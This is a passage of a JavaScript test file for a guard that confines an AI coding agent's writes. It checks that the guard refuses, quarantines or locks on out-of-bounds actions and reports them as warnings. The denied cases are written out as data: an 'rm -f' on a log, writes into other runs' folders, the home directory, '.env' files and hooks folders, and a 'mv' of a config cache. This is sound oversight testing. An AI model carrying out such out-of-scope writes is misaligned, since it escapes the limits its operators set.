    'rm -f ~/.npm/_logs/2026-11-07T09_38_00_000Z-debug-0.log',
    'echo x > ../.voice-runs/beta/abcd/a.txt',
  ]) {
    const s = fenced()
    const { decision } = await s.viaHook('Bash', { command })
    assert.equal(decision?.permissionDecision, 'deny', command)
    assert.deepEqual(s.tripped, [], command)
    assert.equal(s.task.refused.length, 1, command)
    await s.end()
  }
})

test("a new file under the run folders of the run's own repository, outside every run folder, goes to quarantine with the folder its Write made; elsewhere there it locks", async () => {
  // The safety net, for a call the hook did not refuse: the 07:18 Write.
  const s = fenced({ guardHooks: true })
  const guessed = join(s.root, '.voice-runs', 'alpha', '2026-11-07-84rf')
  await s.call(join(guessed, 'pr-body.md'), { name: 'Write', effect: make(join(guessed, 'pr-body.md'), 'placeholder'), report: { cwd: s.alpha, at: Date.now() - 50 } })
  assert.deepEqual(s.tripped, [])
  assert.equal(readFileSync(join(s.folder, 'tq01', '1-pr-body.md'), 'utf8'), 'placeholder')
  assert.ok(!existsSync(guessed), 'the folder the Write made is gone too')
  assert.deepEqual(s.task.quarantined[0].folders, [guessed])
  assert.ok(s.logged.some(line => line.includes(`removed the empty folder it made, ${guessed}`)), s.logged.join('\n'))
  assert.ok(existsSync(s.task.runFolder), 'the run folder stays')
  // A folder there that holds something else stays.
  const kept = join(s.root, '.voice-runs', 'alpha', 'notes')
  make(join(kept, 'other.md'))()
  await s.call(join(kept, 'pr.md'), { name: 'Write', effect: make(join(kept, 'pr.md')), report: { cwd: s.alpha, at: Date.now() - 50 } })
  assert.deepEqual(s.tripped, [])
  assert.ok(existsSync(join(kept, 'other.md')))
  assert.equal(s.task.quarantined[1].folders, undefined)
  // The third invalid write locks, as anywhere.
  const third = join(s.root, '.voice-runs', 'alpha', 'third.md')
  await s.call(third, { name: 'Write', effect: make(third), report: { cwd: s.alpha, at: Date.now() - 50 } })
  assert.match(s.tripped[0], /the third invalid write in one run, after 2 went to quarantine/)
  await s.end()

  // Everything else there locks at once, the first time.
  for (const [rel, reason] of [
    ['.voice-runs/alpha/wxyz/a.md', /a\.md: another run's run folder, which locks at once/],
    ['.voice-runs/beta/abcd/a.md', /a\.md: a hidden file or folder/],
    ['.voice-worktrees/alpha/w1/a.md', /a\.md: a hidden file or folder/],
    ['.voice-runs/alpha/x/.env', /\.env: a hidden file or folder/],
    ['.voice-runs/alpha/x/hooks/a.sh', /a\.sh: a hooks folder/],
  ]) {
    const t = session({
      task: where => ({ guardHooks: true, runFolder: join(where.root, '.voice-runs', 'alpha', '84rf') }),
      runFolders: {
        '.voice-runs/alpha/84rf': { repo: 'alpha', container: null, usedAt: Date.now(), removedAt: null },
        '.voice-runs/alpha/wxyz': { repo: 'alpha', container: null, usedAt: Date.now(), removedAt: null },
      },
    })
    const path = join(t.root, rel)
    await t.call(path, { name: 'Write', effect: make(path), report: { cwd: t.alpha, at: Date.now() - 50 } })
    assert.equal(t.tripped.length, 1, rel)
    assert.match(t.tripped[0], reason, rel)
    assert.ok(existsSync(path), `${rel} stays where it is`)
    await t.end()
  }
})

test('refused calls and quarantined files count together: the third invalid write of a run locks whichever it is', async () => {
  const s = fenced()
  await s.viaHook('Bash', { command: 'mkdir -p ~/ringexp-ff' })
  // One the hook did not see (a run from before the fence, say): the safety net's.
  await s.call('cp ws/report.md ~/copy.md', { effect: make(join(s.home, 'copy.md')) })
  assert.deepEqual(s.tripped, [])
  assert.deepEqual([s.task.refused.length, s.task.quarantined.length], [1, 1])
  await s.viaHook('Write', { file_path: join(s.home, 'third.md'), content: 'x' })
  assert.match(s.tripped[0], /Write .*third\.md: the third invalid write in one run, refused by the guard's hook before it ran, after 1 went to quarantine and the guard's hook refused 1 \(/)
  await s.end()
})

test("the run's result and worker_status say what the guard's hook refused, as a warning", () => {
  const root = join(TMP, 'refused', 'Developer')
  mkdirSync(root, { recursive: true })
  const workers = new Workers({ root, stateDir: join(TMP, 'refused', 'state') })
  try {
    const task = {
      id: 'tq03',
      repo: 'alpha',
      task: 'Release it.',
      state: 'done',
      startedAt: Date.now() - 60000,
      finishedAt: Date.now(),
      steps: [],
      result: 'Released. Wrangler left a log in ~/.config/.wrangler; I left it there.',
      refused: [
        {
          n: 1,
          tool: 'toolu_1',
          paths: ['/home/u/.config/.wrangler/cache.json', '/home/u/.config/.wrangler/logs/w.log'],
          command: '"mv ~/.config/.wrangler/cache.json $TMPDIR/"',
          at: Date.now(),
        },
      ],
    }
    const text = workers.resultText(task)
    assert.match(
      text,
      /^Warning: the gateway's guard refused 1 call of the run before it ran, as a write outside its allowed folders: "mv ~\/\.config\/\.wrangler\/cache\.json \$TMPDIR\/" \(\/home\/u\/\.config\/\.wrangler\/cache\.json, \/home\/u\/\.config\/\.wrangler\/logs\/w\.log\)\. Nothing of it happened\. Each counts as an invalid write; the third of a run locks the kill switch\. Tell the driver in a sentence, as a warning/m,
    )
    assert.ok(text.indexOf('Warning:') < text.indexOf('Result: Released.'), "the gateway's own lines first")
    assert.match(workers.taskLines('alpha', task).join('\n'), /^Warning: the gateway's guard refused 1 call of the run/m)
  } finally {
    workers.close()
  }
})
